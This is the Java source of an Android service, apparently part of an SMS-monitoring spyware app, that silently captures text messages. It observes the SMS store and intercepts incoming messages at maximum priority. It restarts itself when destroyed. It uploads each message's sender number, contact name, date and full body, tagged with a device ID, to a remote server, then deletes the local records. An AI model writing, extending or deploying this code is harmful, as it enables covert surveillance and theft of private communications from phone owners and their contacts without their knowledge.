package com.privacy.monitor.service;

import java.util.ArrayList;
import com.google.gson.Gson;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.ContactsDB;
import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.inte.RunBack;
import com.privacy.monitor.receiver.SMSReceiver;
import com.privacy.monitor.resolver.SMSObserver;
import com.privacy.monitor.resolver.field.SMSConstant;
import com.privacy.monitor.resolver.handler.SMSHandler;
import com.privacy.monitor.service.utilservice.ClientSocket;
import com.privacy.monitor.util.AlarmManagerUtil;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;

/**
 * 短信监听服务
 */
public class SMSMonitoringService extends Service {

	private static final String TAG = SMSMonitoringService.class.getSimpleName();
	private SMSObserver smsObserver;
	private SMSRecordDB sqlite;
	private SharedPreferences sp;
	
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		
		Logger.d(TAG, "短信监听服务启动了");
		ContentResolver smsResolver = getContentResolver();
		smsObserver = new SMSObserver(smsResolver, new SMSHandler(this),getApplicationContext(), new MyRunBack());
		smsResolver.registerContentObserver(SMSConstant.CONTENT_URI, true,smsObserver);
		IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		intentFilter.setPriority(Integer.MAX_VALUE);
		getApplicationContext().registerReceiver(new SMSReceiver(),intentFilter);
		sp = getApplicationContext().getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		AlarmManagerUtil.startCron(getApplicationContext(), C.CRON_ACTION);
	}

	@Override
	public void onDestroy() {
		Logger.d(TAG, "sms服务销毁");
		Intent intent = new Intent(this, SMSMonitoringService.class);
		startService(intent);
		if (smsObserver != null) {
			getContentResolver().unregisterContentObserver(smsObserver);
		}
		super.onDestroy();
	}

	private class MyRunBack implements RunBack {

		@Override
		public void run() {
			sqlite = SMSRecordDB.getInstance(getApplicationContext());
			if (HttpUtil.detect(getApplicationContext())) {
				uploadData(sqlite);
			}
		}

		private void uploadData(SMSRecordDB smsRecordDB) {
			ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS + " = ? ",new String[] { "0" });
			
			if (list != null) {
				ArrayList<ArrayList<String>> msgList = new ArrayList<ArrayList<String>>();
				for (SMSRecord smsRecord : list) {
					ArrayList<String> msgs = new ArrayList<String>();
					msgs.add(smsRecord.getType());
					msgs.add(smsRecord.getPhone());
					msgs.add(smsRecord.getName());
					msgs.add(smsRecord.getDateSent());
					msgs.add(smsRecord.getMessageContent());
					msgList.add(msgs);
				}
				String params = "key=" + ClientSocket.APP_REQ_KEY+ "&device_id=" + sp.getString(C.DEVICE_ID, "")+ "&msg_list=" + new Gson().toJson(msgList);
				Logger.d("SMSMon","正在上传短信记录");
				String uploadResult = NetworkUtil.uploadSMS(getApplicationContext(), params,C.RequestMethod.uploadSMS);
				if (uploadResult != null && !uploadResult.startsWith("FAIL")) {
					Logger.d("SMSMon","上传短信记录成功");
					smsRecordDB.deleteAll();
				}
			}
		}

		@Override
		public void run(Object object) {
			// TODO Auto-generated method stub

		}
	}
}
